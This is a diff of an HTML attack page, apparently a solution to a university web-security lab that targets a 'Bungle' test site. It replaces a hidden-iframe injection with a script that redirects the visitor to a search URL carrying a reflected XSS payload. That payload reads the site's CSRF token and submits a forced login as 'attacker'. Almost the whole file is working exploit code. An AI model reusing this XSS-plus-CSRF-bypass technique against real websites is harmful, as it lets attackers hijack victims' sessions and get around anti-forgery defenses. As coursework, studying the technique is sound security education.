@@ -1,40 +1,48 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <title></title>
-  </head>
-  <body>
+<head>
+  <meta charset="utf-8">
+  <title>Loading...</title>
+</head>
+<body>
+  <script>
+    var xssPayload = `
+      fetch('https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0')
+        .then(r => r.text())
+        .then(html => {
+          var parser = new DOMParser();
+          var doc = parser.parseFromString(html, 'text/html');
+          var token = doc.querySelector('input[name=csrf_token]').value;
+          
+          // Step 2: Submit the login form with the stolen token
+          var form = document.createElement('form');
+          form.method = 'POST';
+          form.action = 'https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0';
+          
+          var u = document.createElement('input');
+          u.name = 'username';
+          u.value = 'attacker';
+          form.appendChild(u);
+          
+          var p = document.createElement('input');
+          p.name = 'password';
+          p.value = 'l33th4x';
+          form.appendChild(p);
+          
+          var t = document.createElement('input');
+          t.name = 'csrf_token';
+          t.value = token;
+          form.appendChild(t);
+          
+          document.body.appendChild(form);
+          form.submit();
+        });
+    `;
 
-    <iframe style="display:none"
-      src="https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0&username=<script>
-        var tokenInput = document.querySelector('input[name=csrf_token]');
-        var token = tokenInput.value;
-
-        var form = document.createElement('form');
-        form.method = 'POST';
-        form.action = '/login?csrfdefense=1&xssdefense=0';
-
-        var u = document.createElement('input');
-        u.name = 'username';
-        u.value = 'attacker';
-
-        var p = document.createElement('input');
-        p.name = 'password';
-        p.value = 'l33th4x';
-
-        var t = document.createElement('input');
-        t.name = 'csrf_token';
-        t.value = token;
-
-        form.appendChild(u);
-        form.appendChild(p);
-        form.appendChild(t);
-
-        document.body.appendChild(form);
-        form.submit();
-      </script>">
-    </iframe>
-
-  </body>
+    var encodedPayload = encodeURIComponent('<script>' + xssPayload + '</' + 'script>');
+    var xssUrl = 'https://bungle.sysnet.ucsd.edu/search?csrfdefense=1&xssdefense=0&q=' + encodedPayload;
+    
+    window.location = xssUrl;
+  </script>
+</body>
 </html>
